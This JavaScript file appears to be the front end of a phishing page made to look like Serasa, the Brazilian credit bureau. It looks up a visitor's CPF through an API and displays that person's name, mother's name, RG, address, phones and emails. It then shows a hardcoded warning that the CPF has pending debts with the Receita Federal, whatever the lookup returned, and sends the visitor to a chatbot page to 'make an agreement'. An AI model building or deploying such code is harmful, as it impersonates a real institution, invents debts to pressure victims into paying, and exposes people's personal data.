/**
 * Script da Página de Redirecionamento
 * Integra consulta CPF com design Serasa
 */

class RedirectPage {
    constructor() {
        this.api = new CPFAPI();
        this.isConsulting = false;
        this.initializeElements();
        this.bindEvents();
        this.initializeValidation();
    }

    initializeElements() {
        // Formulário e campos
        this.form = document.getElementById('cpfForm');
        this.cpfInput = document.getElementById('cpfInput');
        this.cpfError = document.getElementById('cpfError');
        this.searchBtn = document.getElementById('searchBtn');
        
        // Seções de resultado
        this.resultsSection = document.getElementById('resultsSection');
        this.loadingSpinner = document.getElementById('loadingSpinner');
        this.resultCard = document.getElementById('resultCard');
        this.errorCard = document.getElementById('errorCard');
        this.resultContent = document.getElementById('resultContent');
        this.errorContent = document.getElementById('errorContent');
    }

    bindEvents() {
        // Evento de submit do formulário
        this.form.addEventListener('submit', (e) => {
            e.preventDefault();
            this.handleSubmit();
        });
        
        // Validação em tempo real
        this.cpfInput.addEventListener('blur', () => {
            if (this.cpfInput.value.trim()) {
                CPFValidator.validateWithUI(this.cpfInput, this.cpfError);
            }
        });
        
        // Limpar erro ao começar a digitar
        this.cpfInput.addEventListener('input', () => {
            if (this.cpfError.classList.contains('show')) {
                CPFValidator.hideError(this.cpfInput, this.cpfError);
            }
        });

        // Botão "Entrar" no header - scroll para o campo CPF
        const entrarBtn = document.querySelector('.login-section');
        if (entrarBtn) {
            entrarBtn.addEventListener('click', () => {
                this.scrollToCPFField();
            });
        }
    }

    initializeValidation() {
        CPFValidator.applyMask(this.cpfInput);
    }

    scrollToCPFField() {
        const cpfField = document.querySelector('.login-section-card');
        if (cpfField) {
            cpfField.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });
            
            // Foca no campo CPF após o scroll
            setTimeout(() => {
                this.cpfInput.focus();
            }, 500);
        }
    }

    async handleSubmit() {
        // Previne múltiplas consultas simultâneas
        if (this.isConsulting) {
            console.log('⚠️ Consulta já em andamento. Aguarde...');
            return;
        }

        // Valida o CPF
        if (!CPFValidator.validateWithUI(this.cpfInput, this.cpfError)) {
            return;
        }
        
        const cpf = this.cpfInput.value;
        console.log('🔍 Iniciando verificação para CPF:', cpf);
        
        // Marca como consultando
        this.isConsulting = true;
        
        // Mostra loading
        this.showLoading();
        
        try {
            // Faz a consulta
            const resultado = await this.api.consultarCPF(cpf);
            
            if (resultado.success) {
                this.showResult(resultado.data);
                console.log('✅ Verificação realizada com sucesso');
            } else {
                this.showError(resultado.error);
                console.log('❌ Erro na verificação:', resultado.error);
            }
        } catch (error) {
            console.error('Erro inesperado:', error);
            this.showError('Erro inesperado. Tente novamente mais tarde.');
        } finally {
            // Libera para nova consulta
            this.isConsulting = false;
        }
    }

    showLoading() {
        this.searchBtn.disabled = true;
        this.searchBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
        
        this.resultsSection.classList.add('show');
        this.loadingSpinner.style.display = 'block';
        this.resultCard.classList.remove('show');
        this.errorCard.classList.remove('show');
    }

    showResult(data) {
        this.hideLoading();
        
        // Monta o HTML do resultado
        const resultHTML = this.buildResultHTML(data);
        this.resultContent.innerHTML = resultHTML;
        
        // Mostra o card de resultado com animação
        this.resultCard.classList.add('show', 'fade-in');
        this.errorCard.classList.remove('show');

        // Adiciona evento ao botão "quero fazer um acordo"
        const agreementBtn = document.getElementById('agreementBtn');
        if (agreementBtn) {
            agreementBtn.addEventListener('click', () => {
                this.handleAgreementClick();
            });
        }
    }

    showError(errorMessage) {
        this.hideLoading();
        
        this.errorContent.innerHTML = `
            <p><strong>Erro:</strong> ${errorMessage}</p>
            <p>Verifique o CPF informado e tente novamente.</p>
        `;
        
        // Mostra o card de erro com animação
        this.errorCard.classList.add('show', 'fade-in');
        this.resultCard.classList.remove('show');
    }

    hideLoading() {
        this.searchBtn.disabled = false;
        this.searchBtn.innerHTML = '<i class="fas fa-search"></i> Verificar Dívidas';
        this.loadingSpinner.style.display = 'none';
    }

    buildResultHTML(data) {
        return `
            <div class="result-item">
                <strong>CPF:</strong>
                <span>${CPFValidator.format(data.cpf)}</span>
            </div>
            
            <div class="result-item">
                <strong>Nome:</strong>
                <span>${data.nome}</span>
            </div>
            
            <div class="result-item">
                <strong>Situação:</strong>
                <span>${data.situacao}</span>
            </div>
            
            <div class="alert-warning">
                <i class="fas fa-exclamation-triangle"></i>
                <strong>ATENÇÃO:</strong> Este CPF possui débitos pendentes na Receita Federal. 
                É recomendado regularizar a situação o mais rápido possível para evitar 
                bloqueios e multas adicionais.
            </div>
            
            ${data.dataNascimento !== 'Não informado' ? `
            <div class="result-item">
                <strong>Data de Nascimento:</strong>
                <span>${data.dataNascimento}</span>
            </div>
            ` : ''}
            
            ${data.mae !== 'Não informado' ? `
            <div class="result-item">
                <strong>Nome da Mãe:</strong>
                <span>${data.mae}</span>
            </div>
            ` : ''}
            
            ${data.rg !== 'Não informado' ? `
            <div class="result-item">
                <strong>RG:</strong>
                <span>${data.rg}</span>
            </div>
            ` : ''}
            
            ${this.buildEnderecoHTML(data.endereco)}
            
            ${data.telefones.length > 0 ? `
            <div class="result-item">
                <strong>Telefones:</strong>
                <span>${data.telefones.join(', ')}</span>
            </div>
            ` : ''}
            
            ${data.emails.length > 0 ? `
            <div class="result-item">
                <strong>Emails:</strong>
                <span>${data.emails.join(', ')}</span>
            </div>
            ` : ''}
            
            <div class="agreement-section">
                <button class="agreement-btn" id="agreementBtn">
                    <i class="fas fa-handshake"></i>
                    Quero fazer um acordo
                </button>
            </div>
        `;
    }

    buildEnderecoHTML(endereco) {
        if (!endereco || endereco.logradouro === 'Não informado') {
            return '';
        }
        
        const enderecoCompleto = [
            endereco.logradouro,
            endereco.numero !== 'Não informado' ? endereco.numero : '',
            endereco.complemento,
            endereco.bairro !== 'Não informado' ? endereco.bairro : '',
            endereco.cidade !== 'Não informado' ? endereco.cidade : '',
            endereco.uf !== 'Não informado' ? endereco.uf : '',
            endereco.cep !== 'Não informado' ? `CEP: ${endereco.cep}` : ''
        ].filter(item => item && item.trim()).join(', ');
        
        return enderecoCompleto ? `
            <div class="result-item">
                <strong>Endereço:</strong>
                <span>${enderecoCompleto}</span>
            </div>
        ` : '';
    }

    handleAgreementClick() {
        console.log('Botão "Quero fazer um acordo" clicado');
        
        // Pega os dados do usuário do resultado da consulta
        const cpfElement = document.querySelector('.result-item span');
        const nameElement = document.querySelectorAll('.result-item span')[1];
        
        if (cpfElement && nameElement) {
            const cpf = cpfElement.textContent;
            const name = nameElement.textContent;
            
            // Salva os dados no localStorage para o typebot
            localStorage.setItem('userName', name);
            localStorage.setItem('userCPF', cpf);
            
            // Redireciona para o typebot
            window.location.href = 'typebot.html';
        } else {
            // Fallback se não conseguir pegar os dados
            window.location.href = 'typebot.html';
        }
    }
}

// Inicialização quando o DOM estiver carregado
document.addEventListener('DOMContentLoaded', () => {
    const redirectPage = new RedirectPage();
    
    // Torna a instância disponível globalmente para debug
    window.redirectPage = redirectPage;
    
    console.log('🚀 Página de Redirecionamento inicializada com sucesso!');
    
    // Adiciona efeito de entrada suave
    const mainContent = document.querySelector('.main-content');
    if (mainContent) {
        mainContent.style.opacity = '0';
        mainContent.style.transform = 'translateY(20px)';
        
        setTimeout(() => {
            mainContent.style.transition = 'all 0.6s ease';
            mainContent.style.opacity = '1';
            mainContent.style.transform = 'translateY(0)';
        }, 100);
    }
});
